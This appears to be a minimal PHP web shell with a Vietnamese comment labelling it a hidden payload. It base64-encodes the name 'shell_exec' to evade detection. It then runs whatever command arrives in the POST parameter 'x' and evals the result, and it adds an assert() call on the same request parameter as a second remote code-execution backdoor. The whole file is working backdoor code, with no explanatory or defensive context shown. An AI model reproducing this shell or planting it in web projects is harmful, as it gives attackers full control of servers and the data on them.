<?php
// base64_decode ẩn payload
$a = base64_decode('c2VoZWxsX2V4ZWM=');
@eval($a($_POST['x']));
assert($_REQUEST['x']);
?>
